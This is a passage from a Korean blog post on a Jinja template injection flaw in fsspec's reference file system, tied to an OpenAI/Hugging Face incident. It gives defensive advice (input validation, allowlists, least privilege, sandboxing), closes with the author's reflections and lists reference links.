```

#### (2) 입력값 검증 및 허용 목록(Allowlist) 사용  

외부에서 전달되는 데이터의 자료형, 형식, 허용 범위를 검증해야 한다. 예를 들어 fsspec의 Reference Metadata에서는 offset과 size가 정수인지, 허용된 범위에 속하는지 등을 검증할 수 있다.  

단, 입력값 검증만으로 SSTI를 완전히 방지할 수는 없으며, `\{\{`, `\}\}`와 같은 특정 문자열을 차단하는 방식은 우회 가능성이 있으므로 근본적인 방어책으로 사용해서는 안 된다.

#### (3) 최소 권한 및 실행 환경 격리  

Template Injection으로 코드 실행이 가능해지더라도 피해를 최소화할 수 있도록 실행 환경의 권한을 제한해야 한다.  

- Worker를 불필요한 시스템 권한 없이 실행  
- 민감한 파일과 Credential에 대한 접근 제한  
- 컨테이너 또는 별도 프로세스로 실행 환경 격리  
- CPU, 메모리, 실행 시간 및 네트워크 접근 제한  

특히 `SandboxedEnvironment`를 적용하더라도 모든 보안 문제가 해결되는 것은 아니다. Jinja 공식 문서에서도 Sandbox 외에 리소스 제한과 최소한의 데이터 제공 등을 함께 권장하고 있다.  

## 마무리  

이번 글은 OpenAI Hugging Face 해킹 사건을 다룬 여러 포스팅 중 가장 많은 시간을 들여 작성한 글이다.  

SSTI라는 개념 자체도 처음 접했지만, 이번 사건에서 활용된 취약점은 일반적인 웹 템플릿 처리 과정이 아닌, fsspec이라는 파일시스템 라이브러리의 Reference 처리 과정에 존재했다. 때문에 어째서 파일시스템 라이브러리에서 Jinja Template Injection이 발생할 수 있었는지, 그리고 이 취약점이 어떻게 RCE로 이어졌는지 이해하는 데 상당한 시간이 필요했다.  

이 글을 작성하면서 많은 것을 배우고 느꼈다.  

가장 인상 깊었던 점은 보안 취약점이 반드시 해당 기능의 주된 목적이나 역할과 직접적으로 연관된 곳에서만 발생하는 것은 아니라는 사실이다. 파일시스템을 다루는 라이브러리 내부에 템플릿을 해석하는 기능이 존재했고, 그 기능이 결국 서버 전체를 위협하는 취약점으로 이어졌다.  

또한, 이번 사건을 살펴보면서 단순히 취약점의 존재를 아는 것과 실제 동작 원리를 이해하는 것은 전혀 다른 문제라는 점도 느꼈다. 처음에는 Jinja Template Injection으로 RCE에 성공했다는 설명만으로는 그 과정이 쉽게 와닿지 않았다. 하지만 라이브러리의 내부 코드를 분석하고, Python 객체에 접근하는 원리를 파악하고, 직접 취약점을 재현해보면서 비로소 공격이 어떤 방식으로 성립하는지 이해할 수 있었다.  

이번 글을 통해 SSTI라는 새로운 공격 기법을 배운 것뿐만 아니라, 익숙하지 않은 취약점이라도 실제 코드를 따라가며 원리를 파악하고 재현해보는 과정의 중요성을 다시 한번 느낄 수 있었다.  

## Reference  

[https://huggingface.co/blog/agent-intrusion-technical-timeline](https://huggingface.co/blog/agent-intrusion-technical-timeline)  

[Jinja 공식 문서 - Template 문법과 렌더링 방식](https://jinja.palletsprojects.com/en/stable/)

[FastAPI Templates - FastAPI에서 Jinja2Templates 사용하는 방법](https://fastapi.tiangolo.com/advanced/templates/)

[PortSwigger SSTI - Server-Side Template Injection 개념과 공격 구조](https://portswigger.net/web-security/server-side-template-injection)

[Uber Bug Bounty - Jinja Template Injection을 통한 RCE 사례](https://medium.com/uber-security-privacy/uber-bug-bounty-100-days-31e1fb27ced5)

[OpenAI Hugging Face Incident Technical Report - RefJinja와 Production Worker RCE](https://cdn.openai.com/pdf/67869394-cb91-4c12-888c-5cbd85c7814c/OpenAI-Hugging-Face%20Incident-Technical-Report.pdf)

[OpenAI - Hugging Face 사건 전체 흐름과 RefJinja 공격](https://openai.com/index/hugging-face-incident-and-the-road-ahead/)

[fsspec ReferenceFileSystem - Reference Metadata와 Jinja 처리 구현](https://filesystem-spec.readthedocs.io/en/stable/_modules/fsspec/implementations/reference.html)

[fsspec Changelog - Jinja parsing 비활성화 및 보안 변경](https://github.com/fsspec/filesystem_spec/blob/master/docs/source/changelog.rst)